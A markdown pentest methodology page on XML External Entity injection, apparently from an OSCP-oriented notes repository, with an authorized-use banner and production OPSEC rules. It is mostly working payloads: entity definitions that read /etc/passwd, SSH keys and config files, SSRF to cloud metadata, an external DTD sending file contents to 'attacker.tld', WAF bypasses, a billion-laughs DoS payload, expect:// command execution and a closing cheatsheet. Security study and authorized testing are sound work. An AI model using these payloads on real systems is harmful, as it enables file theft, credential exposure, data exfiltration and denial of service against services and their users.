# XXE (XML External Entity)

> XML External Entity injection: the XML parser resolves attacker-controlled
> entities, leading to file read, SSRF, or denial of service.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. Exploitation](#4-exploitation)
- [5. Filter Bypass](#5-filter-bypass)
- [6. Advanced](#6-advanced)
- [7. Tools](#7-tools)
- [8. OSCP Notes](#8-oscp-notes)
- [9. Cheatsheet](#9-cheatsheet)
- [10. References](#10-references)

---

## 1. Overview

XXE abuses XML parsers that resolve external entities. When the parser
processes a DOCTYPE declaration, the entity can reference a file, URL,
or another entity.

**Common entry points:**

- Any endpoint that accepts XML (Content-Type: application/xml, text/xml).
- SOAP APIs.
- SAML authentication (XML-based).
- RSS/Atom feeds, sitemaps, XML imports.
- SVG image uploads (SVG is XML).
- Office documents (DOCX, XLSX, PPTX are ZIPs containing XML).
- PDF generators that accept XML input.
- XML-RPC (WordPress, Drupal, etc.).

**Impact:**

- File read (etc/passwd, config files, SSH keys).
- SSRF (query internal services and cloud metadata).
- DoS (billion laughs, quadratic blowup).
- Rarely RCE (php://expect wrapper, or chained SSRF -> Redis).

**On OSCP:** XXE appears when XML is accepted. File read is the usual goal
and often leads to credentials in config files.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Inline entity file read (etc/passwd) | [PROD-NO] |
| XXE to SSRF (internal service) | [PROD-RISK] |
| XXE to cloud metadata | [PROD-NO] |
| Billion laughs / quadratic blowup | [PROD-NO] (DoS risk) |
| Blind XXE with OOB exfil | [PROD-RISK] |

### 2.2 What NOT to do (production)

- Do NOT read sensitive files (shadow, cloud creds, private keys).
- Do NOT trigger DoS payloads (billion laughs can crash the parser).
- Do NOT exfiltrate production data via OOB channels without approval.
- Do NOT use XXE against SAML endpoints in production without written
  approval (impacts authentication for real users).

### 2.3 Rate limiting

XXE is usually a single request per test. In production, avoid fuzzing
XML endpoints with many malformed payloads (log noise, alert fatigue).

---

## 3. Detection

### 3.1 Where to look

- Endpoints with Content-Type: application/xml or text/xml.
- SOAP APIs (WSDL files describe them).
- RSS/Atom readers, XML sitemaps.
- File upload accepting SVG, DOCX, XLSX, PPTX, or PDF with XML.
- Login endpoints using SAML.
- Any parameter whose value looks like XML.

### 3.2 Basic probe (inline DTD)

Send an XML with an external entity definition and reference it:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

Send it:

```bash
curl 'http://target/api/xml' -H 'Content-Type: application/xml' --data @payload.xml
```

**Expected output:**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

If the response contains file contents, XXE is confirmed.

### 3.3 Blind XXE (out-of-band)

If the response does not reflect the entity, use OOB:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://xyz.oast.fun/dtd.dtd">
  %remote;
]>
```

Set up interactsh and watch for DNS/HTTP callbacks. If the parser fetches
your URL, XXE is present even when no output is reflected.

---

## 4. Exploitation

### 4.1 File read

Linux targets:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///home/user/.bash_history">
```

Windows targets:

```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

### 4.2 SSRF via XXE

Use the entity to trigger an HTTP request from the server:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

The response body (if reflected) contains the internal resource.

### 4.3 Blind XXE - OOB exfiltration

When no output is reflected, exfiltrate via an external DTD.

**Attacker server (dtd.dtd):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://xyz.oast.fun/?data=%file;'>">
%eval;
%exfil;
```

**Payload sent to target:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.tld/dtd.dtd">
  %remote;
]>
```

The parser reads /etc/passwd and sends it to attacker.tld.

### 4.4 Error-based XXE

When OOB is blocked but errors are shown, use a malformed external DTD
to leak data in error messages:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The error message contains the file contents as part of the path.

### 4.5 XXE via SVG upload

SVG is XML. Upload an SVG that references an entity:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text>&xxe;</text>
</svg>
```

Upload the SVG, then view the rendered image or its thumbnail: the file
contents may appear in the response.

### 4.6 XXE via Office documents

DOCX, XLSX, PPTX are ZIP archives with XML inside. Replace the XML with
a payload referencing an entity, rezip, upload.

**Steps:**

```bash
# 1. Extract the archive
unzip document.docx -d docx_extracted

# 2. Edit docx_extracted/word/document.xml - inject the entity payload

# 3. Rezip
cd docx_extracted && zip -r ../payload.docx . && cd ..

# 4. Upload payload.docx
```

Payload inside document.xml:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### 4.7 XXE in SAML

SAML is XML. If the SP accepts unsigned or weakly-signed SAML assertions,
XXE can be injected into the assertion.

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <saml:Assertion>
    <saml:AttributeValue>&xxe;</saml:AttributeValue>
  </saml:Assertion>
</samlp:Response>
```

SAML XXE often needs the SP to skip signature verification. Details in
future 06 Technologies/SAML.md (planned).

---

## 5. Filter Bypass

### 5.1 PHP wrappers

If file:// is blocked, use php://filter to read source with base64:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

### 5.2 Encoding

- UTF-16: send the XML as UTF-16 with BOM (some filters only check UTF-8).
- UTF-7: rarely supported but bypasses some parsers.
- Encode entities twice: &amp;xxe; when the parser decodes twice.

### 5.3 External DTD

If inline DTD is blocked, load the DTD from your server:

```xml
<!DOCTYPE root SYSTEM "http://attacker.tld/dtd.dtd">
```

### 5.4 Bypass WAF

See [WAF-Detection.md](../01%20Recon/WAF-Detection.md) section 6. XXE is
often blocked on the string DOCTYPE or ENTITY - try case variations,
whitespace, UTF-16 encoding, or external DTD.

---

## 6. Advanced

### 6.1 Billion laughs (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

<!-- WARNING: this crashes most parsers. Lab only, never in production -->

### 6.2 Parameter entities (%)

```xml
<!ENTITY % param "value">
```

Parameter entities (%name;) are expanded only inside the DTD and are
used for OOB exfiltration where general entities (&name;) are filtered.

### 6.3 XXE to RCE (rare)

If PHP with expect:// wrapper is enabled:

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

Very rare. More often, XXE -> SSRF -> Redis -> RCE.

---

## 7. Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Manual testing + XXE detection |
| XXEinjector | Automated XXE exploitation |
| interactsh-client | OOB callback listener |
| oxml_xxe | Office document XXE payload generator |
| docem | DOCX/XLSX XXE payload generator |

Examples:

```bash
# XXEinjector
ruby XXEinjector.rb --host=attacker.tld --httpport=80 --file=req.txt --path=/etc/passwd --oob=http

# interactsh
interactsh-client
```

---

## 8. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the XXE payload in the request (DOCTYPE + ENTITY).
> - Screenshot the response with the file contents (/etc/passwd).
> - If chain to RCE, screenshot the intermediate steps and the final shell.
>
> XXE file read alone is a finding. XXE -> credentials -> foothold is the
> usual exam chain.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 9. Cheatsheet

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>

<!-- Blind OOB: load DTD from attacker -->
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.tld/dtd.dtd"> %remote;]>

<!-- PHP filter (bypass file:// filter) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

```bash
curl 'http://target/api/xml' -H 'Content-Type: application/xml' --data @payload.xml
```

---

## 10. References

- OWASP XXE - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- PortSwigger XXE - https://portswigger.net/web-security/xxe
- PayloadsAllTheThings XXE - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- XXEinjector - https://github.com/enjoiz/XXEinjector
- oxml_xxe - https://github.com/BuffaloWill/oxml_xxe

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [SSRF.md](./SSRF.md), [LFI-RFI.md](./LFI-RFI.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
